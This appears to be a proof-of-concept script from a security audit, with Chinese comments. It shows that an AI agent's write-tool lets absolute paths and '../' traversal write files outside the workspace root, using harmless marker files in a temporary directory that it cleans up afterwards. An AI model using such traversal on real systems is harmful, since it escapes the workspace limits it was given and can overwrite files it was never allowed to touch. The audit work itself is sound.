// =============================================================================
// PoC-02 — write-tool 写路径穿越 / 越权写盘（F-08）
// 基线：b84227d9 ｜ 复刻目标：src/tools/write-tool.ts（dist/src/tools/write-tool.js）
//   const absolutePath = isAbsolute(request.path) ? request.path : resolve(request.cwd, request.path);
//   mkdirSync(dirname(absolutePath), { recursive: true });
//   writeFileSync(absolutePath, request.text, 'utf-8');
//   无任何 workspaceRoot 前缀校验 / 相对路径 containment 校验。
// 运行：node poc-02-write-path-traversal.js
// 说明：演示写入目标在 workspaceRoot 之外。写入位置为系统临时目录，PoC 结束后清理。
// =============================================================================

'use strict';

const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

// 直接复用编译产物（与源码 1:1）
const { createWriteTool } = require('../../../../dist/src/tools/write-tool.js');

const workspaceRoot = process.cwd(); // 假设 Agent 工作区 = 仓库 src 根
const escapeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pueblo-poc02-'));
const results = [];

function cleanup() {
  try { fs.rmSync(escapeDir, { recursive: true, force: true }); } catch { /* ignore */ }
}

async function main() {
  const writeTool = createWriteTool({ workspaceRoot });

  // --- 用例 1：绝对路径直写 workspaceRoot 外 -------------------------------------------------
  const absTarget = path.join(escapeDir, 'escaped-abs.txt');
  const r1 = await writeTool({ path: absTarget, text: 'POC-02 escaped via ABSOLUTE path\n', cwd: workspaceRoot });
  results.push({
    case: '1) 绝对路径（无 root 校验）',
    requestPath: absTarget,
    status: r1.status,
    summary: r1.summary,
    fileExistsOutsideRoot: fs.existsSync(absTarget),
    content: fs.existsSync(absTarget) ? fs.readFileSync(absTarget, 'utf-8').trim() : null,
  });

  // --- 用例 2：相对路径 ../ 穿越 ------------------------------------------------------------------
  const relTarget = path.join(escapeDir, 'escaped-rel.txt');
  const relPath = path.relative(workspaceRoot, relTarget).replace(/\\/g, '/'); // ../../../../Temp/... 
  const r2 = await writeTool({ path: relPath, text: 'POC-02 escaped via RELATIVE traversal\n', cwd: workspaceRoot });
  results.push({
    case: '2) 相对路径 ../ 穿越',
    requestPath: relPath,
    status: r2.status,
    summary: r2.summary,
    fileExistsOutsideRoot: fs.existsSync(relTarget),
    content: fs.existsSync(relTarget) ? fs.readFileSync(relTarget, 'utf-8').trim() : null,
  });

  // --- 用例 3：对照 edit-tool 的 resolveEditPath 语义（应拒绝）-----------------------------------
  const r3 = await writeTool({
    path: path.join(workspaceRoot, '..', '..', '..', '..', '..', 'pueblo-poc02-escape-check.txt'),
    text: 'x\n',
    cwd: workspaceRoot,
  });
  results.push({
    case: '3) 深度 ../ 穿越（对照：edit-tool resolveEditPath 会拒绝）',
    requestPath: r3.summary,
    status: r3.status,
    note: r3.status === 'succeeded' ? 'write-tool 接受（edit-tool 同路径会拒绝）' : '已拒绝',
  });

  // 汇总
  console.log('='.repeat(72));
  console.log('PoC-02 结果汇总（F-08 write-tool 路径穿越）  workspaceRoot=' + workspaceRoot);
  console.log('='.repeat(72));
  for (const r of results) {
    console.log('\n### ' + r.case);
    for (const [k, v] of Object.entries(r)) {
      if (k === 'case') continue;
      console.log(`  ${k}: ${JSON.stringify(v)}`);
    }
  }
  const anyEscaped = results.some((r) => r.fileExistsOutsideRoot === true);
  console.log('\n总体判定：' + (anyEscaped ? 'VULN_CONFIRMED — write-tool 可写出 workspaceRoot 外（F-08）' : '未复现'));
  console.log('证据位置：src/tools/write-tool.ts:27-41');
  cleanup();
}

main().catch((e) => { console.error(e); cleanup(); process.exit(1); });
